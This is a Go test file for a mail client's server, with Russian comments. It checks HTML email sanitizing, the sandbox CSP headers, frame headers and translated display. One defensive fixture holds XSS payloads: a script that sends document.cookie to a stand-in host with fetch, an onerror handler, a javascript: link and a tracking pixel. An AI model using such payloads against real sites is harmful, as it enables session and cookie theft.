package api

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/PavluninVladimir/sema/server/internal/mail"
	"github.com/PavluninVladimir/sema/server/internal/store"
)

// Тело письма отдаётся своим адресом и запертым: чужая разметка не должна
// исполняться в адресе Сёмы с её cookie (аудит 7 сентября 2026).
func TestMessageBodyInSandbox(t *testing.T) {
	s, st := testServer(t)
	id := messageWithBody(t, st, `<p>Счёт</p><script>fetch('//зло/'+document.cookie)</script>`+
		`<img src="https://track/пиксель.gif" onerror=alert(1)><a href="javascript:alert(1)">жми</a>`)

	rec := bodyRequest(t, s, "/письмо/"+itoa(id))
	if rec.Code != http.StatusOK {
		t.Fatalf("ответ %d: %s", rec.Code, rec.Body.String())
	}
	body := rec.Body.String()
	for _, нельзя := range []string{"<script>fetch", "document.cookie", "track/пиксель", "javascript:alert", "onerror"} {
		if strings.Contains(body, нельзя) {
			t.Errorf("в ответе осталось %q", нельзя)
		}
	}
	// своих скриптов в документе письма нет ни одного: иначе пришлось бы
	// разрешить `allow-scripts`, и вся песочница держалась бы на том, что
	// разбор не пропустил ни одного чужого
	if strings.Contains(strings.ToLower(body), "<script") {
		t.Errorf("в документе письма есть скрипт:\n%s", clipTest(body))
	}
	if !strings.Contains(body, "Счёт") {
		t.Error("текст письма пропал")
	}

	csp := rec.Header().Get("Content-Security-Policy")
	for _, надо := range []string{"sandbox", "default-src 'none'", "script-src 'none'", "base-uri 'none'", "form-action 'none'"} {
		if !strings.Contains(csp, надо) {
			t.Errorf("в CSP нет %q: %s", надо, csp)
		}
	}
	// источник остаётся непрозрачным: allow-same-origin открыл бы письму
	// доступ к cookie Сёмы, и вся песочница была бы напрасной
	if strings.Contains(csp, "allow-same-origin") {
		t.Errorf("песочница пускает письмо в адрес Сёмы: %s", csp)
	}
	if !strings.Contains(csp, "img-src data:") || strings.Contains(csp, "img-src data: https:") {
		t.Errorf("внешние картинки разрешены без спроса: %s", csp)
	}
	if rec.Header().Get("X-Content-Type-Options") != "nosniff" {
		t.Error("нет nosniff")
	}
	if rec.Header().Get("Referrer-Policy") != "no-referrer" {
		t.Error("отправитель узнает, откуда пришли")
	}

	// скрипты не разрешены ни в песочнице, ни директивой
	if strings.Contains(csp, "allow-scripts") {
		t.Errorf("песочница пускает скрипты: %s", csp)
	}

	// по кнопке человека картинки разрешаются — и заголовком, и разбором
	сКартинками := bodyRequest(t, s, "/письмо/"+itoa(id)+"?картинки=1")
	if !strings.Contains(сКартинками.Header().Get("Content-Security-Policy"), "img-src data: https:") {
		t.Error("по кнопке человека картинки должны разрешаться")
	}
	if !strings.Contains(сКартинками.Body.String(), "track/пиксель") {
		t.Error("по кнопке человека картинка должна доехать")
	}
}

// У письма без HTML рамки нет: показывать нечего, и врать про это нельзя.
func TestMessageWithoutHTML(t *testing.T) {
	s, st := testServer(t)
	id := messageWithBody(t, st, "")
	if rec := bodyRequest(t, s, "/письмо/"+itoa(id)); rec.Code != http.StatusNotFound {
		t.Errorf("ответ %d, а HTML-версии нет", rec.Code)
	}
	doc, err := s.buildScreen("msg:"+itoa(id), "", "", 0)
	if err != nil {
		t.Fatal(err)
	}
	if строка := findRow(doc, "thr-"+itoa(id)); строка == nil {
		t.Fatal("письма нет на экране")
	} else if строка.Frame != "" {
		t.Errorf("рамка есть, а HTML нет: %q", строка.Frame)
	}
}

// А у письма с HTML — есть, и внешние картинки в ней посчитаны.
func TestMessageWithHTMLShownInFrame(t *testing.T) {
	s, st := testServer(t)
	id := messageWithBody(t, st, `<p>Счёт</p><img src="https://track/a.gif"><img src="http://b/c.png">`)
	doc, err := s.buildScreen("msg:"+itoa(id), "", "", 0)
	if err != nil {
		t.Fatal(err)
	}
	строка := findRow(doc, "thr-"+itoa(id))
	if строка == nil {
		t.Fatal("письма нет на экране")
	}
	if строка.Frame != "/письмо/"+itoa(id) {
		t.Errorf("адрес рамки %q", строка.Frame)
	}
	if строка.FrameImages != 2 {
		t.Errorf("внешних картинок насчитано %d, а их 2", строка.FrameImages)
	}
	if строка.Detail == "" {
		t.Error("текстовый вариант должен остаться: человек вправе вернуться к тексту")
	}
}

func messageWithBody(t *testing.T, st *store.Store, html string) int64 {
	t.Helper()
	m := &store.Message{MessageID: "<" + html + "письмо@тест>", Subject: "Счёт-квитанция",
		FromAddr: "billing@пример.рф", FromName: "Пример", Status: store.StatusInboxOK}
	if err := st.InsertMessage(m); err != nil {
		t.Fatal(err)
	}
	// тело кладём тем же путём, что и почта: разбор писем помечает сетевые
	// картинки, и очистка обязана понимать именно этот вид
	if err := st.SaveBody(m.ID, store.Body{Text: "Счёт на оплату", HTML: mail.SanitizeHTML(html)}); err != nil {
		t.Fatal(err)
	}
	return m.ID
}

func bodyRequest(t *testing.T, s *Server, путь string) *httptest.ResponseRecorder {
	t.Helper()
	rec := httptest.NewRecorder()
	req := httptest.NewRequest("GET", путь, nil)
	req.SetPathValue("id", strings.TrimPrefix(strings.Split(путь, "?")[0], "/письмо/"))
	s.handleMessageBody(rec, req)
	return rec
}

func clipTest(s string) string {
	if len(s) > 600 {
		return s[:600]
	}
	return s
}

// Заголовки тела письма проверяем через ВЕСЬ обработчик, а не вызовом
// ручки: общий защитный слой ставит «X-Frame-Options: DENY» всем ответам
// разом, и он сильнее всего, что напишет сама ручка.
//
// Это и случилось 10 сентября 2026: письмо в рамке было серым
// прямоугольником со значком «не открылось», а проверка в настоящем
// браузере беды не видела — заблокированная рамка так же непрозрачна и так
// же шлёт запрос, как рабочая.
func TestMessageFrameNotForbiddenByHeader(t *testing.T) {
	s, st := testServer(t)
	id := messageWithBody(t, st, "<p>Счёт</p>")

	srv := httptest.NewServer(s.Handler())
	defer srv.Close()
	resp, err := srv.Client().Get(srv.URL + "/письмо/" + itoa(id))
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("ответ %d", resp.StatusCode)
	}
	if got := resp.Header.Get("X-Frame-Options"); strings.EqualFold(got, "DENY") {
		t.Errorf("X-Frame-Options: %s — браузер откажется рисовать письмо в нашей же рамке", got)
	}
	csp := resp.Header.Get("Content-Security-Policy")
	if !strings.Contains(csp, "frame-ancestors 'self'") {
		t.Errorf("нет frame-ancestors 'self': чужой сайт сможет вставить письмо к себе\n%s", csp)
	}
	// а на обычном экране запрет остаётся: там рамкам взяться неоткуда
	обычный, err := srv.Client().Get(srv.URL + "/api/health")
	if err != nil {
		t.Fatal(err)
	}
	defer обычный.Body.Close()
	if got := обычный.Header.Get("X-Frame-Options"); !strings.EqualFold(got, "DENY") {
		t.Errorf("на обычном ответе X-Frame-Options: %q — запрет ослаблен шире, чем нужно", got)
	}
}

// Перевод показывается тем же письмом: вёрстка, картинки и порядок
// прежние, меняются только слова. Отдельный раздел с пересказом внизу —
// это уже не письмо.
func TestTranslateInSameMessage(t *testing.T) {
	s, st := testServer(t)
	id := messageWithBody(t, st, `<table><tr><td><b>Total due</b> 512.30</td></tr></table>`)

	// перевода ещё нет — и рамка про него молчит
	doc, err := s.buildScreen("msg:"+itoa(id), "", "", 0)
	if err != nil {
		t.Fatal(err)
	}
	if строка := findRow(doc, "thr-"+itoa(id)); строка == nil {
		t.Fatal("письма нет")
	} else if строка.FrameTranslated != "" {
		t.Errorf("обещан перевод, которого нет: %q", строка.FrameTranslated)
	}
	if rec := bodyRequest(t, s, "/письмо/"+itoa(id)+"?перевод=1"); rec.Code != http.StatusNotFound {
		t.Errorf("несуществующий перевод отдан с кодом %d", rec.Code)
	}

	// перевод появился
	if err := st.SaveTranslation(store.Translation{MessageID: id, Lang: "Русский",
		HTML: `<table><tr><td><b>К оплате</b> 512.30</td></tr></table>`}); err != nil {
		t.Fatal(err)
	}
	doc, err = s.buildScreen("msg:"+itoa(id), "", "", 0)
	if err != nil {
		t.Fatal(err)
	}
	строка := findRow(doc, "thr-"+itoa(id))
	if строка == nil || строка.FrameTranslated == "" {
		t.Fatal("перевод есть, а рамка про него молчит")
	}
	if !strings.Contains(строка.FrameTranslated, "Русский") {
		t.Errorf("не сказано, на какой язык: %q", строка.FrameTranslated)
	}
	// и это по-прежнему письмо, а не пересказ
	rec := bodyRequest(t, s, "/письмо/"+itoa(id)+"?перевод=1")
	if rec.Code != http.StatusOK {
		t.Fatalf("перевод не отдан: %d", rec.Code)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "К оплате") {
		t.Errorf("переведённых слов нет:\n%s", clipTest(body))
	}
	for _, надо := range []string{"<table", "<b>", "512.30"} {
		if !strings.Contains(body, надо) {
			t.Errorf("вёрстка письма изменилась: нет %q", надо)
		}
	}
	// подлинник никуда не делся
	если := bodyRequest(t, s, "/письмо/"+itoa(id))
	if !strings.Contains(если.Body.String(), "Total due") {
		t.Error("подлинник письма подменён переводом")
	}
}
